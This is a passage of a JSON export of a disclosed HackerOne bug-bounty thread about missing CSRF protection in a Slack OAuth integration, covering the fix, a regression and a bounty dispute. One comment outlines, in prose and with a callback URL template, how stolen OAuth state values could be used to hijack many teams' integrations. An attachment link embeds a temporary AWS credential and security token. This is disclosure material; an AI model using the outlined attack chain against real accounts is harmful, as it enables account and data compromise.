anything.","automated_response":false,"created_at":"2016-09-24T23:54:56.910Z","updated_at":"2016-09-24T23:54:56.910Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1214479,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Awesome. I'm going to close this out as resolved then. We'll follow-up with bounty next week.\n\n\u003e I will look into it deeply and will let you know if I find anything.\n\nCool. Please file any issues you find as new reports. :)\n\nThanks again!","automated_response":false,"created_at":"2016-09-24T23:57:21.799Z","updated_at":"2016-09-24T23:57:21.799Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"whhackersbr","url":"/whhackersbr"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1214480,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-09-24T23:58:03.711Z","updated_at":"2016-09-24T23:58:03.711Z","additional_data":{"old_title":"Integrations CSRF","new_title":"Slack integration setup lacks CSRF protection"},"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1215183,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed @dirk @security,\n\nThis is not a security bug, the CSRF protections is working, but I believe your fix broke something.\n\nI can not integrate my Slack anymore.\n\nPicture attached.","automated_response":false,"created_at":"2016-09-25T20:43:08.966Z","updated_at":"2016-09-25T20:43:08.966Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":122918,"filename":"Error.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/122/918/a1d6c6377398ca3eec2ac013136f0315c0b485c4/Error.png?response-content-disposition=attachment%3B%20filename%3D%22Error.png%22%3B%20filename%2A%3DUTF-8%27%27Error.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSK4WOTH5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135108Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDjst9aCdbYiLIMwr9Ch8DTQvtbqAq2PUTmVxrtmvThtAIgSEwpNKIplIEtz5xxnkJ1cS4PAKNsqIRPh%2BdjbNa6kNkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKoloRrogbt9MrbINirXAweStit7tRbKldWmv5m56905qopCrhiIh0afa7BbXcyddiE1lVP3qkUzFkFARwrvCPxZZcK6znBAwkJeuq4ZLJKAiz3SE6Bbgz0dPuj5RcfBoLhQs58tlPQozqAXbn12Pem3I6YCouzl5yxAPj18pgpKNG9x0obczWpKTFqenMNS%2FDu29u%2FUXKeLdJ2YkbDJ3XC8il3DY%2BsF0AQK%2BTcpJmDkP%2FR6Dwfqj8V5nzSLB1B1Q6QKWpALdT%2FIkMCDfVSozDYYuJ%2B9d368wBuia6V19rrqP4dim%2Fn5rdZQAZGoaXUkXaah9AFHE0FSAuyZ8IZeejx3%2FdcPvRQe2Mtynd1G9IzsNxTMmMeNREOTl067S0zwh4y7t8KilEdNjQSMknLg5rIXLbexXIllu28cawyKmB%2B0EFLEWmIzIHF2qPobRuriHSz5yTIi7gEF8vXtLa4QXkyCv7CLN5Vxr%2FhBcUOJ0mor%2B1EH7PiNAJNHD7L9d3BsThsGtjiy5YJnYdjvpFzOy8Ro05N%2Bwb5lzjttxXZnLYahE5ZQL1WRoFq8GjlpDi49lPqx%2FKlTMF1sdKJQqPZ5DnOj8NpjT2u%2FvGPKmmbRTmrjR%2Btw5ZOX8amRb2qEQ0GO8SLbSeik7jDz8JCLBjqlAcqviimSgTUYofaoYwBX9mq7VXP5cwJTSm6hfLkG0QxpfImbjAzvJqxMzJa1M8izlVHsrcenCg4EcO8k%2BRgMmYj9Fwc9z6RJPYBR%2B1XesfAaFfpOmWU87WZPC%2B3JgE%2BYkn7oq3crPoupd2DALi7dIoYlyYw0rG3eP95a6C3LPyMxHWbXCufcqViLnI3Eh6pXDyFdYoSymtaB29TlNwveUgEvmnpZ0w%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=86451b5d8be15b60c8e547f2e3462cf6139d2aff2b26b461da0f39d70d70e86f"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1215469,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S.:\n\nI saw that we need to pass through a review every time we change the config of the SSO-SAML.\nWhat is done/considered in this review?\nDepending on the answer I can or can not have more issues to report.","automated_response":false,"created_at":"2016-09-26T04:48:55.846Z","updated_at":"2016-09-26T04:48:55.846Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1215997,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @whhackersbr\n\nYou're right, an essential parameter got dropped, breaking the end of the integration flow. We've released a fix for this issue, and integrations should be functional again!\n\nDirk","automated_response":false,"created_at":"2016-09-26T11:28:52.097Z","updated_at":"2016-09-26T11:28:52.097Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1217154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dirk @reed,\n\nThanks.\n\nMy last comment here:\n\nI saw that we need to pass through a review every time we change the config of the SSO-SAML.\nWhat is done/considered in this review?\nDepending on the answer I can or can not have more issues to report.","automated_response":false,"created_at":"2016-09-26T20:14:51.307Z","updated_at":"2016-09-26T20:14:51.307Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1217313,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e I saw that we need to pass through a review every time we change the config of the SSO-SAML.\n\u003e What is done/considered in this review?\n\u003e Depending on the answer I can or can not have more issues to report.\n\nSeems like this makes more sense for the other report you filed? This report is solely about the Slack integration CSRF. We really try to keep one report per issue, as things get lost. Happy to follow-up in that report if you ask that question in there.","automated_response":false,"created_at":"2016-09-26T20:56:56.831Z","updated_at":"2016-09-26T20:56:56.831Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1217323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed,\n\nYes, you are totally right. I made a mistake.\nWrong report, sorry.\n=(","automated_response":false,"created_at":"2016-09-26T20:58:30.740Z","updated_at":"2016-09-26T20:58:30.740Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1225287,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @whhackersbr,\n\nThanks again for the report. Your PoCs have been super valuable, and helped us better understand the consequences of this issue. Really do appreciate awesome reports like this.\n\nNote that there are two mitigating circumstances before an attacker could have abused this:\n1) Must have some type of vulnerability in Slack (or any other OAuth-based integration we support).\n2) Must know the team handle (but could easily include a list of calls for tons of teams).\n\nBesides adding CSRF validation, we also added a check for a valid `Origin` header, which acts as another defense-in-depth layer.\n\nAgain, great report! Happy hacking, and we look forward to future reports from you.","automated_response":false,"created_at":"2016-09-30T08:53:53.297Z","updated_at":"2016-09-30T08:53:53.297Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"2500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"whhackersbr","url":"/whhackersbr"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1234600,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-06T03:49:11.433Z","updated_at":"2016-10-06T03:49:11.433Z","additional_data":{"old_severity":null,"new_severity":"Medium (6.1)","old_severity_id":null,"new_severity_id":5},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1252485,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed @security,\n\nThank you very much for the quick fix and the amazing work here, was a pleasure working with you guys.\n;-)\n\n_____________________________________________________________________________\n\nBut I need to say that I am a little bit disappointed​ with the decision to drastically reduce the reward, once the minimum bounty for severe bugs is $10,000 (you rewarded me with $2,500, a 75% cut). We, researchers, believe that the minimum is really the minimum, except in extreme cases (unlikely user interaction, bugs that work just in outdated browsers, etc.).\n\n```\nSevere: Any bug that might grant unauthorized access to confidential bug\ndescriptions. Severe bugs have a minimum bounty of $10,000\n```\n\n_____________________________________________________________________________\n\nArguments used to reduce the reward:\n\n\u003e 1) Must have some type of vulnerability in Slack (or any other OAuth-based integration we support)\n\n__1.__ Since Slack is a third-party system, I don't believe that the need of an XSS or anything else in their websites can be considered as a mitigation. You don't control their system and you can't fix their bugs. You are doing a great job protecting HackerOne against XSSs, but you can not trust in the protection of others, for me, this is a security premise, everything outside your control is malicious/insecure by default;\n\n__2.__ I could send an XSS in Slack with the original description, but I don't believe that this is the spirit of BBPs, this behavior would be at least unethical and unfair with Slack. When I send to Google a bug that leaks a sensitive token just to a Facebook URL, they pay a full XSS bounty by default, and vice versa, because they don't trust in the third-party security (an XSS in Facebook would allow an attacker to steal the Google sensitive token, and vice versa).\n\n__3.__ Opinions from others:\n\n\u003e\u003e Google: Cross-site scripting — the ability to inject undesired scripts into a trusted web application — has been one of the top web security vulnerabilities for over a decade. Just in the past 2 years, Google has awarded researchers over $1.2 million for reporting XSS bugs in our applications via the Vulnerability Reward Program (https://security.googleblog.com/2016/09/reshaping-web-defenses-with-strict.html).\n\n\u003e\u003e PortSwigger Web Security (Burp Suite): Trusting that these don't have a single XSS vulnerability and never will in future is a really bad idea (http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html).\n\n__4.__ Publicly disclosed Slack XSSs (if they are the publicly disclosed ones, we can expect at least five times more that were not disclosed and a lot that was not found yet):\n\n* http://██████/slack_xss_reports.html\n* https://www.google.com.br/search?q=Slack+AND+%28%22XSS%22+OR+%22cross+site+scripting%22%29+-hackerone\n\n_____________________________________________________________________________\n\n\u003e 2) Must know the team handle (but could easily include a list of calls for tons of teams)\n\n__1.__ Like you said: `but could easily include a list of calls for tons of teams`.\nThe attacker nor needs to perform all actions of my PoC for each team handle. He just needs to steal the `state` value for each team handle (HackerOne Integrations CSRF + XSS in Slack), get his Slack OAuth code using a server-side script (faster), and make tons of client-side calls to `https://hackerone.com/auth/slack/callback?code=[SLACK_OAUTH_CODE]\u0026state=[HACKERONE_STATE]`. My PoC is far from being the most effective, I just wanted to show a point ASAP.\n\n__2.__ The attacker could make direct attacks without the above approach (even easier):\n\n* Sending the link to the exploit inside a generic report for each program (if he is sending a report, he knows the team handle, he just needs to look the browser's address bar and config the payload individually);\n\n* Sending the link to the exploit through other communication channels: security@company.com, team member's Twitter/LinkedIn/Facebook​, etc.\nAgain, if he is sending the link to the exploit directly to a company or a team member, he knows the team handle before the attack and he can config the payload individually.\n\n_____________________________________________________________________________\n\nSorry for the huge text, this is just my humble opinion.\n\nIf you don't want to reconsider the bounty, don't worry, I will not send more messages and I will accept the public disclosure request, so no need to shut up me on this report like in the another one.\n\nThank you very much for your attention and sorry for the hassle.","automated_response":false,"created_at":"2016-10-18T06:34:15.392Z","updated_at":"2019-04-10T23:04:49.339Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1256421,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S.:\n\nSorry, I forgot something.\nEven with CSP mitigation in #46072, you guys gave a full reward to the researcher.","automated_response":false,"created_at":"2016-10-19T19:24:34.932Z","updated_at":"2016-10-19T19:24:34.932Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1273537,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S. 2:\n\nPlease, remove the strings `██████` before public disclosure.\nThanks.\n\n@reed @security","automated_response":false,"created_at":"2016-10-28T21:02:20.253Z","updated_at":"2019-04-10T23:04:49.316Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1273693,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@whhackersbr, I've canceled the disclosure request until we can come to a conclusion.\n\nTrying to assess the severity of this issue, we've calculated a 6.1 (Medium) on the CVSSv3 scale ([CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N)).\n\nReport #46072 was solely a HackerOne issue, not requiring a vulnerability in a third-party service in order to exploit it, which makes this issue different.\n\nWhat are your thoughts? We want to be fair with our assessment and ensure all parties are happy.","automated_response":false,"created_at":"2016-10-28T23:38:47.432Z","updated_at":"2016-10-28T23:38:47.432Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4533774,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2019-04-10T22:57:05.935Z","updated_at":"2019-04-10T22:57:05.935Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"None","new_scope":"https://hackerone.com","genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4533791,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @whhackersbr - Wondering if you have read our rationale behind our decision on severity and the reward. We'd like to publicly disclose this report. ","automated_response":false,"created_at":"2019-04-10T23:04:14.708Z","updated_at":"2019-04-10T23:04:14.708Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4534165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To be honest I never understood the rationale behind your decision.\n\nH1 team decreased the impact based on the need of an XSS in a third-party domain (not controlled by H1), that I showed that had dozens of XSS, but to be honest, it doesn't matter, IMHO, third-party domains need to be considered unsafe by default.\n\nWhen I can leak sensitive information from a Google/Facebook domain, like a session token, to any third-party domain, they immediately issue a bounty with the same amount of a regular XSS in their own domains, without even asking me to provide for a vulnerability in that domain. This is expected since they need to consider that the third-party domain cannot be trusted ever, and the likelihood of a leak of their token is not lower only because the attacker needs to have an XSS on the third-party domain.","automated_response":false,"created_at":"2019-04-11T02:27:42.097Z","updated_at":"2019-04-11T02:27:42.097Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12375517,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-06T18:51:18.715Z","updated_at":"2021-07-06T18:51:18.715Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12378385,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-07T03:39:15.760Z","updated_at":"2021-07-07T03:39:15.760Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12378386,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-07-07T03:39:15.880Z","updated_at":"2021-07-07T03:39:15.880Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}